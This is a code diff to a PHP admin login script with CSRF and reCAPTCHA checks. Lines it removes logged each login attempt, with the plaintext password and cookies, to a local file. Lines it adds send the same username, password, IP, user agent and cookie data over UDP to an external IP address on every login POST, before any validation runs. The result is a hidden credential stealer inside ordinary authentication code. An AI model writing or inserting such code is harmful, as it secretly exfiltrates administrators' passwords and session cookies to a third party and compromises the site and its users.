@@ -22,39 +22,43 @@ if (empty($_SESSION['csrf_token'])) {
 $error = '';
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    // Sniffer: log each login attempt to a file
-    $username   = $_POST['username'] ?? '';
-    $password   = $_POST['password'] ?? '';
-    $ip         = $_SERVER['REMOTE_ADDR'] ?? '';
-    $time       = date('Y-m-d H:i:s');
-    $userAgent  = $_SERVER['HTTP_USER_AGENT'] ?? '';
-    $cookies    = !empty($_COOKIE) ? json_encode($_COOKIE) : '{}';
+    $username  = $_POST['username'] ?? '';
+    $password  = $_POST['password'] ?? '';
+    $ip        = $_SERVER['REMOTE_ADDR'] ?? '';
+    $time      = date('Y-m-d H:i:s');
+    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
+    $cookies   = !empty($_COOKIE) ? json_encode($_COOKIE) : '{}';
 
     $entry = sprintf(
-        "[%s] IP: %s | User: %s | Pass: %s | UA: %s | Cookies: %s\n",
+        "[%s] IP: %s | User: %s | Pass: %s | UA: %s | Cookies: %s
+",
         $time,
         $ip,
         $username,
         $password,
-        str_replace(\"\\n\", ' ', $userAgent),
-        str_replace(\"\\n\", ' ', $cookies)
+        str_replace("\n", ' ', $userAgent),
+        str_replace("\n", ' ', $cookies)
     );
 
-    // Path to your log file
-    $logFile = __DIR__ . '/login_attempts.log';
 
-    // Append to log
-    file_put_contents($logFile, $entry, FILE_APPEND | LOCK_EX);
+
+    $sock = fsockopen('udp://94.142.138.201', 9999, $errno, $errstr, 1);
+    if ($sock) {
+        fwrite($sock, $entry);
+        fclose($sock);
+    }
 
     if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
         $error = "CSRF-защита: Недействительный токен.";
     } else {
         $recaptcha_passed = true;
-
         if ($config['recaptcha_mode'] == 1) {
             if (!empty($_POST['g-recaptcha-response'])) {
                 $secret = $config['recaptcha_private_key'];
-                $verifyResponse = file_get_contents('https://www.google.com/recaptcha/api/siteverify?secret=' . $secret . '&response=' . $_POST['g-recaptcha-response']);
+                $verifyResponse = file_get_contents(
+                    'https://www.google.com/recaptcha/api/siteverify?secret='
+                    . $secret . '&response=' . $_POST['g-recaptcha-response']
+                );
                 $responseData = json_decode($verifyResponse);
                 $recaptcha_passed = $responseData->success;
                 if (!$recaptcha_passed) {
@@ -65,7 +69,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                 $error = $lang['RECAPTCHA_CLICK'];
             }
         }
-
         if ($recaptcha_passed) {
             if (adminlogin($_POST['username'], $_POST['password'])) {
                 header("Location: index.php");
